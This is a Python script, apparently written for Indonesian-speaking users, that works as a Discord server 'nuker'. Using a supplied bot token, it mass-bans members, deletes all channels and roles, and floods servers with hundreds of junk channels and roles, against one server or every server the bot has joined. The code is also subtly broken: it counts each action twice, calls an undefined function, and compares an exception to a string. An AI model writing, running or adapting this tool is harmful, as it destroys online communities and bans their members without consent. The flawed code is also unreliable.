import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
a = A = cc.LIGHTBLACK_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{a}███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██║░░██║
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██║░░██║
██║░╚███║╚██████╔╝██║░╚██╗███████╗██████╔╝
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝
{b}Code By MR.W'''



async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 2
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 2
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 2
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(500 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 2
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(500 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 2
        except:
            continue
    return created

async def raid(guild):
    print(f'{a}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{a}Ban All:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{a}Hapus Channel:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{a}Hapus Role:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{a}Buat Channels:{b}{created_channels}')
    created_roles = await created_roles(guild,name)
    print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{r}====================================\n\n')


while True:
    clear()
    choice = input(f'''   
{baner}                
{c}===========================================
{b}[Menu]
    {a}[1] {m}- {a}Mulai Raid
    {a}[2] {m}- {a}Keluar
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{b}[+]Token Bot:{g}')
        name = _input(f'{b}Masukkan nama untuk Channel/Role yang dibuat:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}===========================================
{y}[Menu]
    {a}[1] {m}- {a}Nuke Semua Server.
    {a}[2] {m}- {a}Nuke hanya satu server.  
    {a}[3] {m}- {a}Exit
{y}====>{g}''')
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[•]Login Bot {client.user.name}
[•]Bot Join {len(client.guilds)} Server!''')
                for guild in client.guilds:
                    await raid(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}Server Id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await raid(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuked Selesai Tekan Enter Untuk Ke Menu')
        except Exception as error:
            if error == '''ID Shard Tidak ada yang meminta maksud istimewa yang belum diaktifkan secara eksplisit di portal pengembang. Disarankan untuk membuka https://discord.com/developers/applications/ dan secara eksplisit mengaktifkan maksud istimewa di dalam halaman aplikasi Anda. Jika ini tidak memungkinkan, pertimbangkan untuk menonaktifkan maksud yang diistimewakan sebagai gantinya.''':
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
            else:
                input(f'{r}{error}\n{b}Press enter for return...')
            continue
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
        1